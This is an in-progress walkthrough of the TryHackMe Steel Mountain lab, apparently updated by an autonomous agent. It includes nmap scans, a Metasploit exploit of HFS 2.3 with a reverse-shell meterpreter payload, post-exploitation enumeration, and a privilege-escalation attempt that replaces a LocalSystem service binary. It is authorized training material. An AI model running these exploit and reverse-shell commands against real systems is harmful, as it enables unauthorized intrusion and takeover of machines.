# Steel Mountain (THM) — Walkthrough

Status: In Progress (stable user foothold achieved; service-binary privesc path validated; SYSTEM callback capture still pending)
Target: 10.146.141.173
Scope: Authorized TryHackMe lab target only

## Why this walkthrough is structured this way
The goal is to teach decision-making, not just run commands.
For a new machine, start broad, then narrow:
1) full-port discovery,
2) service/version enumeration on discovered ports,
3) web validation,
4) exploit selection based on evidence,
5) post-exploitation and privilege escalation.

## Step 1 — Full TCP port discovery first
Start with all ports so you do not miss alternate entry points.

```bash
nmap -Pn -n -p- --min-rate 1000 -T4 10.146.141.173 -oN scans/steel-allports.txt
```

Example outcome on this target:
- 80/tcp open
- 8080/tcp open

Why this matters:
- You now know the attack surface before making assumptions.

## Step 2 — Service/version enumeration on discovered ports
Now enumerate only what was found in step 1.

```bash
nmap -Pn -n -sC -sV -p80,8080 10.146.141.173 -oN scans/steel-services.txt
```

Observed:
- 80/tcp: Microsoft IIS 8.5
- 8080/tcp: HttpFileServer (HFS) 2.3

## Step 3 — Validate web behavior manually
Check both web ports directly.

```bash
curl -sI http://10.146.141.173:80 | head
curl -sI http://10.146.141.173:8080 | head
```

Observed indicator:
```text
HTTP/1.1 200 OK
Server: HFS 2.3
```

Why this matters:
- Version evidence drives exploit selection.

## Step 4 — Exploit research: Metasploit first, Searchsploit second
Use Metasploit search first because you are already in an exploitation framework and can move directly to execution.

In msfconsole:
```text
search hfs
search rejetto
info exploit/windows/http/rejetto_hfs_exec
```

Why searchsploit was also used:
- Cross-check CVE/EDB references independently.
- Provide alternate PoC path if MSF module is unavailable/fails.

Searchsploit check:
```bash
searchsploit hfs 2.3
searchsploit -m 39161
```

Decision here:
- HFS 2.3 + known module available -> use `exploit/windows/http/rejetto_hfs_exec`.

## Step 5 — Initial access with evidence
In msfconsole:
```text
use exploit/windows/http/rejetto_hfs_exec
set RHOSTS 10.146.141.173
set RPORT 8080
set payload windows/meterpreter/reverse_tcp
set LHOST <YOUR_VPN_IP>
set LPORT 4444
run -z
sessions -l
```

Proof captured:
```text
[*] Meterpreter session opened (... -> 10.146.141.173:49xxx)
meterpreter x86/windows  STEELMOUNTAIN\bill @ STEELMOUNTAIN
```

## Step 6 — Post-exploitation baseline (before privesc)
```text
sessions -i <ID>
getuid
sysinfo
shell -c whoami
shell -c whoami /priv
shell -c type C:\Users\bill\Desktop\user.txt
```

Why this matters:
- Confirms user context, OS, privilege baseline, and user-level proof.

## Step 7 — PrivEsc methodology (what to try and why)
Move through branches systematically:

1. Token/SYSTEM quick wins
```text
getsystem
load incognito
list_tokens -u
```

2. Local exploit and host enumeration
```text
run post/multi/recon/local_exploit_suggester
run post/windows/gather/enum_services
```

3. Service/task abuse checks
```text
shell -c sc query state^= all
shell -c schtasks /query /fo LIST /v
```

4. Credential/secrets checks
```text
shell -c cmdkey /list
shell -c dir C:\ /b /s *unattend*.xml
```

Goal:
- Convert bill context to `NT AUTHORITY\SYSTEM` and capture administrator/root proof.

## What changed from earlier draft
- Removed repetitive tunnel-ops reminders from narrative.
- Restored proper teaching flow: full-port scan first, targeted enumeration second.
- Added explicit exploit-selection reasoning (MSF search first, searchsploit as corroboration/fallback).

## Current progress snapshot
- Recon validated: 80 + 8080.
- HFS 2.3 confirmed.
- Stable command-shell foothold as `STEELMOUNTAIN\\bill` re-established with user proof:
  - `whoami` -> `steelmountain\\bill`
  - `type C:\\Users\\bill\\Desktop\\user.txt` -> `b04763b6fcf51fcd7c13abc7db4fd365`
- PrivEsc branch validated (service-binary replacement):
  - `sc qc AdvancedSystemCareService9` shows `SERVICE_START_NAME : LocalSystem`
  - `copy /Y C:\\Users\\bill\\ascrev.exe "C:\\Program Files (x86)\\IObit\\Advanced SystemCare\\ASCService.exe"` succeeded (`1 file(s) copied.`)
  - Service restart commands issued (`sc stop/start AdvancedSystemCareService9`).
- Remaining gap: capture reliable SYSTEM callback and root proof output in same run.

## Next update condition
This walkthrough will be updated with:
1) exact privesc path used,
2) SYSTEM proof output,
3) final administrator/root flag proof.

### 2026-05-23T00:07:21Z — Autonomous troubleshooting cycle update
- Full-port baseline re-run completed (not just 80/8080):
  - Open TCP: `80,135,139,445,3389,5985,8080,47001,49152-49156,49188,49190`
  - Evidence: `scans/steel-allports-latest.txt`
- Targeted service enum refreshed:
  - `80/tcp Microsoft-IIS/8.5`, `8080/tcp HFS 2.3`
  - Evidence: `scans/steel-services-latest.txt`
- Exploit research order followed and revalidated:
  - Searchsploit first: HFS 2.3 entries include EDB `39161.py`
- Foothold troubleshooting:
  - Failure observed with staged meterpreter (`windows/meterpreter/reverse_tcp`) causing callback churn and repeated invalid/closed sessions.
  - Pivot applied: switched to stageless `windows/meterpreter_reverse_tcp` on a new LPORT (`4445` then `4447`) to reduce session churn.
  - Result: stable single live meterpreter session confirmed as `STEELMOUNTAIN\\bill`.
  - Evidence: `logs/steel_state/stable_attempt.log`, `logs/steel_state/post_attempt.log`
- PrivEsc status this cycle:
  - `getsystem` attempted and failed (`All pipe instances are busy`), no SYSTEM token obtained.
  - Root proof command not captured this cycle.
